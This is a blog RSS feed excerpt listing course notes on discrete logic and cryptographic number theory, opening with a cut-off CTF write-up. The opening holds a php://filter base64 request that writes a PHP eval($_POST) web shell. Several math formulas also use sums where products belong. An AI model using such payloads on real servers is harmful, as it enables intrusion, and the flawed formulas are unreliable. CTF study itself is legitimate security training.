base64绕过 base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。
?filename=php://filter/convert.base64-decode/resource=1.php&amp;amp;content=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw== [😮Mid]太极掌门人 &amp;lt;?php error_reporting(0); show_source(__FILE__); function deleteDir($path) { if (is_dir($path)) { $dirs = scandir($path); foreach ($dirs as $dir) { if ($dir !</description>
    </item>
    
    <item>
      <title>离散数学CH05-一阶逻辑等值演算与推理</title>
      <link>https://shenyiming.life/discrete-mathematics/ch05/</link>
      <pubDate>Tue, 12 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/discrete-mathematics/ch05/</guid>
      <description>一阶逻辑等值式与置换规则 定义5.1 $$ 设A,B是一阶逻辑中任意两个公式，若A\leftrightarrow B 是永真式，则称A与B等值 \\ 记作A\Leftrightarrow B $$
基本等值式 第1组 第二章P21页，16组重言式
双重否定律、幂等律、交换律、结合律等
第2组   量词否定等值式 $$ \neg \forall xA(x)\Leftrightarrow \exist x \neg A(x) $$
  量词辖域收缩与扩张等值式
设公式A(x)含自由出现的个体变项x，B不含x的自由出现，则 $$ \forall x (A(x)\vee B)\Leftrightarrow \forall xA(x)\vee B \\ \forall x (A(x)\rightarrow B)\Leftrightarrow \exist xA(x)\rightarrow B \\ \exist x(A(x)\rightarrow B)\Leftrightarrow \forall x A(x)\rightarrow B \\ $$
  量词分配等值式 $$ \forall x(A(x)\wedge B(x))\Leftrightarrow \forall xA(x)\wedge \forall xB(x) $$
  进行等值演算，除以上基本等值式外，还有以下2条规则</description>
    </item>
    
    <item>
      <title>4 二次剩余</title>
      <link>https://shenyiming.life/cryptologymath/4.1_%E4%BA%8C%E6%AC%A1%E5%89%A9%E4%BD%99%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E5%92%8C%E6%80%A7%E8%B4%A8/</link>
      <pubDate>Mon, 11 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/cryptologymath/4.1_%E4%BA%8C%E6%AC%A1%E5%89%A9%E4%BD%99%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E5%92%8C%E6%80%A7%E8%B4%A8/</guid>
      <description>定义4.1.1 $$ 设a为整数，p为奇素数，p\nmid a，如果同余方程\ x^2\equiv a(mod\quad p)有解，则称a是模p的二次剩余\ 否则称a是模p的二次非剩余。 $$
4.2 勒让德符号 定义4.2.1 $$ 设p为奇素数，对于每个整数a，定义勒让德符号如下\ (\frac{a}{p})=1, p\nmid a 并且a是 $$
定理 4.2.1 $$ 若p为奇素数，则\ (1)(欧拉判别法)\ (\frac{a}{p})\equiv a^{\frac{p-1}{2}}(mod\quad p) \ p\mid a ,() $$
整数的标准素因数分解式 $$ a=+- 2^e q^{e_1}_1\cdots q^{e_s}_s $$ 则 $$ (\frac{a}{p})=(\frac{+-1}{p})(\frac{2}{p})^e (\frac{q_1}{p})^{e_1}\cdots (\frac{q_s}{p})^{e_s} $$
定理4.2.2 $$ 若p为奇素数，则\ (1)(\frac{a}{p})=(\frac{a+p}{p});\ (2)当p\nmid a时\ (3)(\frac{1}{p})=1\ (\frac{1}{p})\equiv 1^{\frac{p-1}{2}}\equiv 1(mod\quad p) $$</description>
    </item>
    
    <item>
      <title>3.4 流程图</title>
      <link>https://shenyiming.life/cryptologymath/3.4%E5%AE%9E%E9%AA%8C_%E5%9F%BA%E4%BA%8E%E4%B8%AD%E5%9B%BD%E5%89%A9%E4%BD%99%E5%AE%9A%E7%90%86%E7%9A%84%E7%A7%98%E5%AF%86%E5%85%B1%E4%BA%AB%E6%96%B9%E6%A1%88/</link>
      <pubDate>Sat, 09 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/cryptologymath/3.4%E5%AE%9E%E9%AA%8C_%E5%9F%BA%E4%BA%8E%E4%B8%AD%E5%9B%BD%E5%89%A9%E4%BD%99%E5%AE%9A%E7%90%86%E7%9A%84%E7%A7%98%E5%AF%86%E5%85%B1%E4%BA%AB%E6%96%B9%E6%A1%88/</guid>
      <description>st=&amp;gt;start: 开始op1=&amp;gt;operation: 读入秘密Kop2=&amp;gt;operation: 生成数组d[n]cond=&amp;gt;condition: 判断是否满足N&amp;gt;K&amp;gt;Mop3=&amp;gt;operation: K依次模d生成密钥串k[n]op4=&amp;gt;operation: 使用t个密钥利用CRT还原K&#39;cond2=&amp;gt;condition: 判断K&#39;是否等于Ke1=&amp;gt;end: 恢复成功e2=&amp;gt;end: 恢复失败st-&amp;gt;op1-&amp;gt;op2-&amp;gt;cond-&amp;gt;op3-&amp;gt;op4-&amp;gt;cond2cond(yes)-&amp;gt;op3cond(no)-&amp;gt;op2cond2(yes)-&amp;gt;e1cond2(no)-&amp;gt;e2</description>
    </item>
    
    <item>
      <title>3.4 基于中国剩余定理的秘密共享</title>
      <link>https://shenyiming.life/cryptologymath/3.4_%E5%9F%BA%E4%BA%8E%E4%B8%AD%E5%9B%BD%E5%89%A9%E4%BD%99%E5%AE%9A%E7%90%86%E7%9A%84%E7%A7%98%E5%AF%86%E5%85%B1%E4%BA%AB/</link>
      <pubDate>Fri, 08 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/cryptologymath/3.4_%E5%9F%BA%E4%BA%8E%E4%B8%AD%E5%9B%BD%E5%89%A9%E4%BD%99%E5%AE%9A%E7%90%86%E7%9A%84%E7%A7%98%E5%AF%86%E5%85%B1%E4%BA%AB/</guid>
      <description>背景 $$ 将秘密k分成n个子秘密k_1,k_2,\cdots,k_n,满足下面两个条件：\\ (1)\quad 如果已知t个k_i 值，易于恢复出k\\ (2)\quad 如果已知任意t-1个或更少个k_i值，不能恢复出k\\ $$
比如，将一个密钥分成n份，那么n个人中至少t人在场才能获得密钥
方案 分割 $$ (t,n)门限，选择n个整数d_1,d_2,\cdots,d_n，满足\\ (1)d_1&amp;lt;d_2&amp;lt;\cdots &amp;lt;d_n\quad d_i严格递增\\ (2)(d_i,d_j)=1,i\ne j; \quad d_i两两互素\\ (3)N=d_1\times d_2\times\cdots \times d_t\\ M=d_{n-t+2}\times d_{n-t+3}\times \cdots \times d_n,有N\gt M\\ \\ 对于某个秘密k,要求N\gt k\gt M, 计算\\ k_1 \equiv k(mod \quad d_1)\\ $$
恢复 $$ 在n个子秘密里任意选择t个:\\ (k_{i1},d_{i1}),\cdots,(k_{i_t},d_{i_t})\\ 基于中国剩余定理计算下列一次同余方程组\\ x\equiv k_{i1}(mod\quad d_{i_1})\\ x\equiv k_{i_2}(mod\quad d_{i_2})\\ \vdots\\ x\equiv k_{i_t}(mod\quad d_{i_t})\\ 恢复出\\ x\equiv k(mod\quad N_1),N_1=d_{i_1},d_{i_2}\cdots,d_{i_t} $$
计算中国剩余定理中，x用公式最后求出来的解一定是模m的
例题 例题3.4.1 $$ (2,3)门限，选择3个整数d_1=9,d_2=11,d_3=13\\ N=99,M=13,有N\gt M\\ 对于秘密k=74,要求99\gt 74\gt 13,计算\\ k_1 \equiv 74\equiv 2 (mod\quad 9)\\ k_2 \equiv 74\equiv 8 (mod\quad 11)\\ k_n \equiv 74\equiv 9 (mod\quad 13)\\ 子密钥为(9,2),(11,8), $$</description>
    </item>
    
    <item>
      <title>离散数学CH04-一阶逻辑基本概念</title>
      <link>https://shenyiming.life/discrete-mathematics/ch04/</link>
      <pubDate>Fri, 08 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/discrete-mathematics/ch04/</guid>
      <description>一阶逻辑命题符号化 一阶逻辑公式及其解释 定义4.5 $$ 在公式\forall x A 和\exist x A 中，称x为指导变元，A为量词的辖域\\ 在\forall x \exist x的辖域中，x的所有出现都称作约束出现，A中不是\\ 约束出现的其他变项均被称作自由出现 $$
定义4.6 $$ 设A是任意的公式，若A中不含自由出现的个体变项，则称A为封闭的公式，简称闭式 $$</description>
    </item>
    
    <item>
      <title>离散数学CH03-命题逻辑的推理理论</title>
      <link>https://shenyiming.life/discrete-mathematics/ch03/</link>
      <pubDate>Thu, 07 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/discrete-mathematics/ch03/</guid>
      <description>前言  所谓推理是指从前提出发推出结论的思维过程，而前提是已知的命题公式集合，结论是从前提出发应用推理规则推出的命题公式。
 定理3.1  命题公式 $$ A_1,A_2,\cdots,A_k $$ 推出B的推理正确当且仅当 $$ A_1\wedge A_2,\wedge \cdots,\wedge A_k \to B $$ 为重言式。
 今后把推理的形式结构写成: $$ 前提：A_1,A_2,\cdots,A_k\\ 结论：B $$ 并根据判断定理3.1的蕴含式是否是重言式来确定推理是否正确。根据前2章的讨论，判断是否为重言式有下面3种方法：
 真值表法 等值演算法 主析取范式法  常用重言蕴含式（推理定律）  $$ (A\to B)\wedge A \Rightarrow B \qquad 假言推理\\ (A\to B)\wedge \neg B\Rightarrow \neg A\qquad 拒取式\\ (A\vee B)\wedge \neg B \Rightarrow A \qquad 析取三段论\\ (A\to B)\wedge (B\to C)\Rightarrow (A\to C) \qquad 假言三段论\\ $$
 推理证明格式 例3.3 在自然推理系统P中构造下面推理的证明。 前提：$$P\vee q,q\to r,p\to s,\neg s$$</description>
    </item>
    
    <item>
      <title>3.3 一次同余方程</title>
      <link>https://shenyiming.life/cryptologymath/3.3_%E4%B8%80%E6%AC%A1%E5%90%8C%E4%BD%99%E6%96%B9%E7%A8%8B/</link>
      <pubDate>Thu, 30 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/cryptologymath/3.3_%E4%B8%80%E6%AC%A1%E5%90%8C%E4%BD%99%E6%96%B9%E7%A8%8B/</guid>
      <description>一次同余方程 定义3.1.1  变数个数多于方程个数，且取整数值的方程（或方程组）称为不定方程（组）
 定理3.1.1  二元一次不定方程ax+by+n有整数解的充要条件是(a,b) | n
 定理3.1.2  设二元一次不定方程ax+by=n有解 $$ x_0,y_0 为它的一组整数解(特解)，则该方程的通解为：\\ x=x_0+\frac{b}{(a,b)}t\\ y=y_0-\frac{a}{(a,b)}t,t\in Z $$
 例3.1.1 求解2x+3y=7的通解 解： $$ (2,3)=1,易知x_0=2,y_0=1是原方程一解，则由定理3.1.2知\\ x=x_0+bt=2+3t\\ y=y_0-at=1-2t $$
定理3.1.3 一次同余方程结论  $$ 同余方程ax+b\equiv 0(mod\quad m)有解当且仅当(a,m) | b\\ 若ax+b\equiv 0(mod\quad m)有解，则在模m的意义下解数为(a,m)个\\ 记x_0为其中一个解，则该方程通解为\\ x_0+t\frac{m}{(a,m)}(mod\quad m)\\ 其中0\le t \lt (a,m),t\in Z $$
 证明： $$ ax+b\equiv 0(mod\quad m)\leftrightarrow ax+b=my\\ 套用定理3.1.1和3.1.2即可 $$
例题3.1.3 求解一次同余方程 $$ 32x\equiv 12(mod \quad 8)\\ (32,8)=8\nmid 12无解 $$</description>
    </item>
    
    <item>
      <title>2.5 素性检测算法</title>
      <link>https://shenyiming.life/cryptologymath/2.5_%E7%B4%A0%E6%80%A7%E6%A3%80%E6%B5%8B%E7%AE%97%E6%B3%95/</link>
      <pubDate>Sun, 26 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/cryptologymath/2.5_%E7%B4%A0%E6%80%A7%E6%A3%80%E6%B5%8B%E7%AE%97%E6%B3%95/</guid>
      <description>费马小定理 根据费马小定理，p为素数，对任意整数b就有 $$ b^{p-1}\equiv 1(mod\quad p) $$ 问题： $$ 如果有一个整数b,(b,m)=1,使得\\ b^{m-1}\neq 1(mod\quad m)\\ 则m是一个合数，\\ 但反之不一定。 $$
定义2.5.1 $$ 设m是一个奇合数，如果整数b,(b,m)=1,使得同余式\\ b^{m-1}\equiv 1(mod\quad m)\\ 成立，则m称为对于基b的伪素数。 $$
费马概率素性检验算法 $$ 给定奇整数m\ge 3和安全参数k\\
 随机选取整数b,2\le b\le m -2\\ 计算g=(b,m),如果g\ne 1，则m为合数\\ 计算r\equiv b^{m-1}(mod\quad m)，如果r\ne 1,则m为合数\\ 如果不是上述两种，则m可能为素数\\ 上述过程重复k次，如果每次都是m可能为素数，则m为素数的概率为1-\frac{1}{2^k}\\ $$  MILLER-RABIN素性检测算法 $$ 设m是奇素数，并且有m-1=2^st，则有以下因数分解式：\\ b^{m-1}-1=(b^{2^{s-1}t}+1)(b^{2^{s-2}t}+1)\cdots (b^t+1)(b^t-1)\\ b^{m-1}\equiv 1(mod\quad m) $$
定义2.5.2 $$ 设m是一个奇合数，且有表示式m-1=2^st，其中t为奇数\\ 设整数b和m互素，如果整数m和b满足条件\\ b^t\equiv 1(mod\quad m)\\ 或者存在一个整数r,0\le r\lt s使得\\ b^{2^rt}\equiv -1(mod\quad m)\\ 则m称为对于基b的强伪素数 $$
例 $$ m=2047=23\cdot 89 \\ m-1=2046=2^1\cdot 1023\\ 设b=2\\ 2^t=2^1023=(2^11)^93 = 2048^93\equiv 1(mod\quad 2047) $$</description>
    </item>
    
    <item>
      <title>2.6 RSA公钥密码算法</title>
      <link>https://shenyiming.life/cryptologymath/2.6_rsa%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95/</link>
      <pubDate>Sat, 25 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/cryptologymath/2.6_rsa%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95/</guid>
      <description>密钥生成  随机生成两个不同的大素数p和q $计算n=pq和\phi(n)=(p-1)(q-1)$ 随机选取整数e,$1\lt e\lt \phi(n)，使得(e,\phi(n))=1$ 计算唯一的整数d,使得 $$ed\equiv 1(mod\quad \phi(n))$$  $$ 公钥是K^A_e = (n,e)\\ 私钥是K_d^A=d\\ $$
加密过程 用公钥加密明文m,产生密文c
 获取公钥 $$c\equiv m ^e(mod\quad n)$$ 发送密文  解密过程 </description>
    </item>
    
    <item>
      <title>2.4 欧拉定理和费马小定理</title>
      <link>https://shenyiming.life/cryptologymath/2.4_%E6%AC%A7%E6%8B%89%E5%AE%9A%E7%90%86%E5%92%8C%E8%B4%B9%E9%A9%AC%E5%B0%8F%E5%AE%9A%E7%90%86/</link>
      <pubDate>Fri, 24 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/cryptologymath/2.4_%E6%AC%A7%E6%8B%89%E5%AE%9A%E7%90%86%E5%92%8C%E8%B4%B9%E9%A9%AC%E5%B0%8F%E5%AE%9A%E7%90%86/</guid>
      <description>定理2.4.1 (欧拉定理) $$ 设m为正整数，a为整数，并且(a,m)=1，则\\ a^{\phi(m)}\equiv 1(mod\quad m)\\ $$
证明： $$ 取模m的一个即约剩余系b_1,b_2,\cdots,b_s, s=\phi(m),则\\ ab_1,ab_2,\cdots,ab_s也是取模m的一个即约剩余系，于是\\ b_1\cdot b_2\cdots b_s\equiv ab_1\cdot ab_2\cdots ab_s\equiv a^s\cdot b_1\cdot b_2\cdots b_s $$
定理2.4.2 (费马小定理) $$ 设p为素数，则对于每个整数a，有\\ a^p\equiv a(mod\quad p) $$
证明： $$ p | a 时\\ a^p(mod\quad p)\equiv 0,a(mod\quad p)\equiv 0,即 a^p\equiv a\equiv 0(mod\quad p)\\ p\nmid a时,由于p为素数，故(a,p)=1，由欧拉定理有\\ a^{p-1}\equiv 1(mod\quad p) $$
例题 例题2.4.1 $$ 设m=11,a=2,有(2,11)=1,\phi(11)=10\\ 故 2^{10} \equiv 1(mod \quad 11) $$
例题2.4.3 $$ 计算7^{10001}(mod\quad 10) $$
解： $$ a=7,m=10 $$</description>
    </item>
    
    <item>
      <title>2.3 欧拉函数</title>
      <link>https://shenyiming.life/cryptologymath/2.3_%E6%AC%A7%E6%8B%89%E5%87%BD%E6%95%B0/</link>
      <pubDate>Thu, 23 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/cryptologymath/2.3_%E6%AC%A7%E6%8B%89%E5%87%BD%E6%95%B0/</guid>
      <description>定理2.3.1 $$ 设m是正整数，a,b\in Z,且(a,m)=1,若x遍历模m的一个完全剩余系，则ax+b也遍历模m的一个完全剩余系。 $$
定理2.3.2 $$ 设m_1,m_2是两个互素的正整数，若x_1,x_2分别遍历m_1,m_2的完全剩余系，则m_2x_1+m_1m_2遍历\\模m_1m_2的完全剩余系。 $$
定理2.3.3 $$ 设m是一个正整数，a\in Z,且(a,m)=1。\\若x遍历模m的一个既约剩余系，则ax也遍历模m的一个既约剩余系。 $$
证明： $$ 因为(a,m)=1,(x,m)=1,有\\ (ax,m)=1\\ 这说明ax是某个既约同余类中元素。\\ 又ax_1\equiv ax_2(mod\quad m)时，有x_1\equiv x_2(mod\quad m)\\ $$
定理2.3.4 $$ 设m_1,m_2是互素的两个正整数，如果x_1,x_2分别遍历模m_1和模m_2的既约剩余系\\ 则m_2x_1+m_1x_2遍历模m_1m_2的既约剩余系。 $$
 证明： $$ 首先证明m_2x_1+m_1x_2与m_1m_2互素，因为\\ (m_2x_1 +m_1x_2,m_1)=(m_2x_1,m_1)=(x_1,m_1)=1\\ (m_2x_1+m_1x_2,m_2)=(m_1x_2,m_2)=(x_2,m_2)=1\\ 所以得到\\ (m_2x_1+m_1x_2,m_1m_2)=1 $$
定理2.3.5 乘积的欧拉函数就等于欧拉函数的乘积 $$ 设n，m是互素的两个正整数，则\\ \phi(nm)=\phi(n)\phi(m) $$
定理2.3.6 欧拉函数的计算 $$ 设\phi(1)=1。当n\ge 2时，设n=p_1^{e_1}p_2^{e_2}\cdots p_s^{e_s}是n的标准分解式，则\\ \phi(n)=\Sigma_{l=1}^{s}(p_l^{e_l}-p_l^{e_{l-1}})=n\cdot \Sigma^s_{l=1}(1-\frac{1}{p_l})\\ $$
例题 例2.3.1 若已知 $$ m_1=8,完全剩余系{0,1,2,3,4,5,6,7}，即约剩余系{1,3,5,7}\\ m_2=3,完全剩余系{0,1,2},即约剩余系{1,2}\\ 求模24完全剩余系和模24即约剩余系： $$ 解： $$ 模24完全剩余系\\ {m_2x_1+m_1x_2}={3\cdot{0,1,2,3,4,5,6,7}+8\cdot{0,1,2}}\\ ={0,1,2,3,4,5,6,7,8,9,10,\cdots,23} $$
例2.3.2 计算下列欧拉函数 $$ \phi(286)=\phi(2\cdot 11\cdot 13)=\phi(2)\cdot \phi(11)\cdot\phi(13)\\ =1\cdot 10 \cdot 12 =120 $$</description>
    </item>
    
    <item>
      <title>2.2 同余类与既约同余类</title>
      <link>https://shenyiming.life/cryptologymath/2.2_%E5%90%8C%E4%BD%99%E7%B1%BB%E4%B8%8E%E6%97%A2%E7%BA%A6%E5%90%8C%E4%BD%99%E7%B1%BB/</link>
      <pubDate>Wed, 22 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/cryptologymath/2.2_%E5%90%8C%E4%BD%99%E7%B1%BB%E4%B8%8E%E6%97%A2%E7%BA%A6%E5%90%8C%E4%BD%99%E7%B1%BB/</guid>
      <description>例题2.2.1 设 $$m=6,\forall a\in Z,a=6q+r,其中q,r\in Z ,r=0,1,2,3,4,5$$
可分为6类，例如r=0时，所有a为模6同余于0 $$ a_1\equiv a_2 \equiv \cdots a_n \equiv 0 (mod\quad 6)\\ -18,-12,-6,0,6\cdots代表元为0, 表示为[0] $$ [0],[1],[2],[3],[4],[5]称为模6的同余类
具有如下性质：
 6个集合彼此不相交 并集为Z  定义2.2.1 同余类 $$ m\in N^+,\forall i \in Z, 记[i]={x:x\in Z,x\equiv i (mod\quad m)} $$
则每个集合[i]称为模m的一个同余类
若(i,m)=1,则同余类[i]称作模m的既约同余类
m=6的既约同余类有[1],[5] 2个，即$\phi(6)=2$（欧拉函数）
定理2.2.1 同余类 $$ 设m\in N^+,[a],[b]模m的同余类，则有\\ [a]=[b]\Leftrightarrow a\equiv b(mod\quad m) $$
定义2.2.2 欧拉函数 $$ m\in Z^+,小于m且与m互素的整数的个数表示成\phi(m)，称为m的欧拉函数 $$
定义2.2.3 剩余系 $$ m个整数a_1,a_2,\cdots,a_m称作模m的完全剩余系，是指a_1,a_2,\cdots,a_m彼此模m不同余。 $$
完系由m个整数组成，这m个整数彼此模m不同余。 $$ \phi(m)个整数b_1,b_2,\cdots,b_{\phi(m)}称作模m的既约剩余系，是指其彼此模m不同余且均与m互素 $$ 既约剩余系又称缩系。</description>
    </item>
    
    <item>
      <title>2.1 同余</title>
      <link>https://shenyiming.life/cryptologymath/2.1_%E5%90%8C%E4%BD%99/</link>
      <pubDate>Mon, 20 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/cryptologymath/2.1_%E5%90%8C%E4%BD%99/</guid>
      <description>定义2.1.1 $$ 设m\in N^+,a_1,a_2\in Z，如果m\mid (a_2-a_1)，则称a_1和a_2模m同余，记作\\ a_1 \equiv a_a(mod\quad m) $$ 该式称为模m的同余式，简称同余式。
$$ 反之，如果m\nmid a_2-a_1，则称不同余。\\ $$ $$ 39\equiv25(mod\quad7)\\ $$ $$ a\equiv0(mod\quad n)\Leftrightarrow n|a\\ 所有的偶数表示为a\equiv 0(mod\quad 2) 所有的奇数表示为a\equiv 1(mod\quad 2) $$
定理2.1.1 设n是一个正整数，则模n同余是等价关系，具有以下性质：
 自反性 对称性 传递性  定理2.1.2 设$$n\in N^+,a\equiv b(mod\quad n),c\equiv d(mod\quad n),k\in Z$$
 $$a+c\equiv b+d(mod\quad n),特别地，a+k\equiv b+k(mod\quad n)$$ $$ac\equiv bd(mod\quad n),ak\equiv bk(mod\quad n),a^n\equiv b^n(mod\quad n)$$ $$若m为非零整数，则a\equiv b(mod \quad n)\Leftrightarrow am\equiv bm(mod\quad nm)$$ $$若m|n，则a\equiv b(mod\quad n)，则有a\equiv b(mod\quad m)，特别地，若l\in N^+，a\equiv b(mod\quad n^l)$$。 $$若k\in Z,ak\equiv bk(mod\quad m)，则a\equiv b(mod\frac{m}{(k,m)})。特别地，若(k,m)=1，a\equiv b(mod\quad m)$$（整除的性质（6））  定理2.</description>
    </item>
    
    <item>
      <title>离散数学CH02-命题逻辑等值演算</title>
      <link>https://shenyiming.life/discrete-mathematics/ch02/</link>
      <pubDate>Sun, 19 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/discrete-mathematics/ch02/</guid>
      <description>析取范式与合取范式 定理2.3（范式存在定理） 任一命题公式都存在与之等值的析取范式和合取范式，求给定公式的步骤为：
  消去连接词
  用双重否定律消去双重否定符，用德摩根律内移否定符。
  使用分配律：求析取范式时使用 $$\land合取$$ 对 $$ \vee析取 $$ 的分配律，求合取范式相反。
合取对析取的分配律： $$ A\wedge(B\vee C)\Leftrightarrow (A\wedge B)\vee(A\wedge C) $$
  定义2.4  在含有n个命题变项的简单合取式（简单析取式）中，若每个命题变项和它的否定式只出现一次，将其按照下标从小到大排列，则这样的简单合取式称为最小项。
 例： $$ p\wedge q成真赋值为\quad1\quad 1\\ 则按照二位二进制，(11)_2=3，故此项为极小项m_3 $$
联结词的完备集 定义2.6 $$ 称F:{0,1}^n\rightarrow {0,1}为n元真值函数 $$
n个命题变项共可构成$2^{2^n}$个不同的真值函数。
   P $$F_0^{(1)}$$ $$F_1^{(1)}$$ $$F_2^{(1)}$$ $$F_3^{(1)}$$     0 0 0 1 1   1 0 1 0 1    按照n位二进制进行编号。</description>
    </item>
    
    <item>
      <title>离散数学CH01-命题逻辑的基本概念</title>
      <link>https://shenyiming.life/discrete-mathematics/ch01/</link>
      <pubDate>Sat, 18 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/discrete-mathematics/ch01/</guid>
      <description>命题与联结词 定义1.2  设p,q为两个命题，复合命题“p并且q”（或“p与q”）称为p与q的合取式，记作$p\wedge q$
规定$p\wedge q$为真当且仅当p与q同时为真。
 定义1.3  设p,q为两个命题，复合命题“p或q”，称为p与q的析取式，记作 $$ p\vee q $$
规定$$p\vee q$$为假当且仅当p与q同时为假。
 定义1.4  设p,q为两个命题，复合命题“如果p，则q”，称为p与q的蕴含式，记作$$ p\rightarrow q$$
并称p为蕴含式的前件，q为蕴含式的后件
规定p→q为假当且仅当p为真，q为假。==若前件为假，则蕴含式恒真==
 </description>
    </item>
    
    <item>
      <title>1.5 素数的生成</title>
      <link>https://shenyiming.life/cryptologymath/1.5_%E7%B4%A0%E6%95%B0%E7%9A%84%E7%94%9F%E6%88%90-/</link>
      <pubDate>Thu, 16 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/cryptologymath/1.5_%E7%B4%A0%E6%95%B0%E7%9A%84%E7%94%9F%E6%88%90-/</guid>
      <description>定理1.5.1 埃拉托斯特尼筛法 埃氏筛 设n是一个正整数，如果对所有的素数 $$ p\le\sqrt{n} $$ 都有 $$ p\nmid n $$ ，则n一定是素数。
证明（反证法）：假设n是合数，则n有一个大于1的最小正因数p，则有 $$ p\mid n $$ ,且p是素数，且 $$ p\le \sqrt{a} $$
 这是因为如果p是合数，则存在整数q，1&amp;lt;q&amp;lt;p，使得 $$ q\mid p $$ ，又 $$ p\mid n $$ ，所以 $$ q\mid n $$ ，这与p是n的最小正因数矛盾。 因为n是合数，所以存在整数 $$ n_1 $$ ，使得 $$ n=n_1\cdot p_1,1&amp;lt;p\le n_1&amp;lt;n $$ ，因此 $$ p^2\le n，故p\le \sqrt{n} $$  </description>
    </item>
    
    <item>
      <title>第一章 例题</title>
      <link>https://shenyiming.life/cryptologymath/1.6_%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BE%8B%E9%A2%98/</link>
      <pubDate>Thu, 16 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/cryptologymath/1.6_%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BE%8B%E9%A2%98/</guid>
      <description>1. 对任意整数a,b,c，证明：[(a,b),(a,c)]=(a,[b,c]) 证明： $$ 设a=p_1^{a_1}p_2^{a_2}\cdots p_s^{a_s},b=\cdots,c=\cdots则 \\ (标准素因数分解) \\ [(a,b),(a,c)]=\Sigma_{i=1}^sp_i^{max(min(a_i,b_i),min(a_i,c_i))} \\ (a,[b,c])=\Sigma_{i=1}^sp_i^{min(a_i,max(b_i,c_i))} $$
2. 设m,n为正整数，m是奇数，求证：$2^m-1和2^n+1$互素 证明： $$ 假设(2^m-1,2^n+1)=d,d\ge2,于是\exist x,y\in Z使得\\ 2^m=dx +1\\ 2^n=dy -1\\ \exist\mu\in Z \quad2^{mn}=(2^m)^n=d\mu+1\\ 注意到，m为奇数，故\\ \exist v\in Z \quad 2^{mn}=(2^n)^m=dv-1\\ 所以有d(v-\mu)=2，从而必有d=2,矛盾。 $$
3. 利用最大公因数的表达式证明：若$(a,m)=(b,m)=1$，则有$(ab,m)=1$。 证明：
由$(a,m)=(b,m)=1$可知，$\exist x,y,u,v\in Z$，使得 $$ ax+my=1,bu+mv=1\\ (ax)(bu)=(1-my)(1-mv)\\ 1-my-mv+m\cdot myv\\ ab(xu)+m(y+v-myv)=1\\ 由xu,y+v-myv\in Z可知，(ab,m)=1 $$
4. 利用最大公因数的表达式证明：若(m,a)=1,$m\mid ab$则有$m\mid b$ 证明：
由$(m,a)=1$知 $$ mx+ay=1\\ 两边同乘b\\ mbx+aby=b\\ 因为m\mid ab,m\mid m 所以等式左边能被m整除\\ 故右边-b能被m整除\\ 所以m\mid b $$
5. 求方程243x+198y=909的一组整数解 利用欧几里德算法，as+bt=(a,b)</description>
    </item>
    
    <item>
      <title>欧几里德算法</title>
      <link>https://shenyiming.life/cryptologymath/1.4_%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%B7%E7%AE%97%E6%B3%95/</link>
      <pubDate>Sun, 12 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/cryptologymath/1.4_%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%B7%E7%AE%97%E6%B3%95/</guid>
      <description>定理1.4.1 设$a_0,a_1\in Z,a_1\ne0$，按下述方式反复作带余除法，有限步后必可以除尽 $$ a_0=a_1q_0+a_2 \\\\ a_1=a_2q_1+a_3 \\\\ \vdots \\\\ a_{n-2}=a_{n-1}q_{n-2}+a_n a_{n-1}=a_{n}q_{n-1}+a_{n+1} \\\\ a_{n+1}=0\\ 则有(a_0,a_1)=a_n $$ 证明1：有限步除尽
证明2：最小公因数为$a_n$(最后不为0的余数)
欧几里德算法——辗转相除法——更相减损术（九章算术）
例题1.4.1 设a=963, b=657
(1)求最大公因数（a,b） $$ 963 = 1\times657+306 \\ 657=2\times306+45 \\ 306=6\times45+36\\ 45=1\times36+9\\ 36=4\times9 $$ (963,657) = 9
(2)求整数as + bt = (a,b) $$ 963 = 1\times657+306 &amp;amp;\rightarrow 7\times657-15\times(963-657)=22\times657-15\times963 \\ 657=2\times306+45&amp;amp;\rightarrow 7\times(657-2\times306)-306=7\times657-15\times306 \\ 306=6\times45+36\\ 45=1\times36+9&amp;amp;\\ 36=4\times9 $$
例题1.4.2 设a=-1859和b=1573,求最大公因数（a，b）和整数s，t，使as+bt=(a,b) $$ 1859=1\times1573+286\searrow&amp;amp;(-1859)\times5+1573\times6\\ 1573=5\times286+143\searrow&amp;amp;1573-5\times(1859-1\times1573)\\ 286=2\times143&amp;amp;143=1573-5\times286\\ $$</description>
    </item>
    
    <item>
      <title>MoeCTF 2021 西电新生赛WP</title>
      <link>https://shenyiming.life/post/12.moectf-web-write-up/</link>
      <pubDate>Thu, 19 Aug 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/post/12.moectf-web-write-up/</guid>
